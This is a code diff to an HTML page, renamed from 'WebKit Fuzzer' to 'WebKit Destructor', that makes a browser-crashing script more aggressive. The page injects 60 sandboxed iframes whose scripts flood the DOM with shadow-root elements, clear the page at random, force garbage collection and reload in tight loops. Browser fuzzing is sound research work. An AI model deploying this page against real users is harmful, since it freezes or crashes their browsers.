@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebKit Fuzzer</title>
+  <title>🔥 WebKit Destructor</title>
   <style>
     body {
       background: black;
@@ -19,7 +19,7 @@
   </style>
 </head>
 <body>
-  <div id="log">[+] Starting aggressive WebKit fuzzer...</div>
+  <div id="log">[+] Launching destructo-fuzzer...</div>
 
   <script>
     const log = msg => {
@@ -33,41 +33,52 @@
 <html>
   <body style='background:black; color:#0f0; font-family:monospace;'>
     <script>
-      let frame = 0;
-      function fillDOM() {
-        for (let i = 0; i < 500; i++) {
-          const d = document.createElement("div");
-          d.textContent = "FZ_" + frame + "_" + i;
-          const s = d.attachShadow({ mode: "open" });
-          for (let j = 0; j < 100; j++) {
-            const span = document.createElement("span");
-            span.textContent = "X" + j;
-            s.appendChild(span);
-          }
-          document.body.appendChild(d);
-        }
+      let f = 0;
 
-        if (Math.random() < 0.3) document.body.innerHTML = "";
-        if (typeof gc === "function") gc();
+      function spamDOM() {
+        try {
+          for (let i = 0; i < 5000; i++) {
+            const d = document.createElement("div");
+            d.textContent = "SPAM_" + f + "_" + i;
+            const s = d.attachShadow({ mode: "open" });
+            for (let j = 0; j < 100; j++) {
+              const span = document.createElement("span");
+              span.textContent = "X" + j;
+              s.appendChild(span);
+            }
+            document.body.appendChild(d);
+          }
+
+          if (Math.random() < 0.5) document.body.innerHTML = "<h1>BOOM</h1>";
+          if (Math.random() < 0.4) while (Math.random() < 0.95) document.body.appendChild(document.createElement("p"));
+          if (Math.random() < 0.2) location.reload();
+
+          if (typeof gc === "function") gc();
+        } catch (e) {}
       }
 
-      function loop() {
-        fillDOM();
-        frame++;
-        setTimeout(loop, 50);
+      function destructiveLoop() {
+        let i = 0;
+        function burn() {
+          i++;
+          spamDOM();
+          if (i % 3 === 0) requestAnimationFrame(burn);
+          else setTimeout(burn, 0);
+        }
+        burn();
       }
 
       new MutationObserver(() => {
-        if (Math.random() < 0.4) document.body.innerHTML = "";
+        if (Math.random() < 0.5) document.body.innerHTML = "<marquee>💀</marquee>";
       }).observe(document.body, { childList: true, subtree: true });
 
-      loop();
+      destructiveLoop();
     <\/script>
   </body>
 </html>
 `.trim();
 
-    const TOTAL_IFRAMES = 40;
+    const TOTAL_IFRAMES = 60;
     let count = 0;
 
     function injectNext() {
@@ -76,9 +87,9 @@
       iframe.setAttribute("sandbox", "allow-scripts");
       iframe.srcdoc = iframePayload;
       document.body.appendChild(iframe);
-      log("[+] Iframe " + count + " injected");
+      log("[+] Destructor iframe " + count + " injected");
       count++;
-      setTimeout(injectNext, 300); // uno cada 300ms
+      setTimeout(injectNext, 200); // más rápido
     }
 
     injectNext();
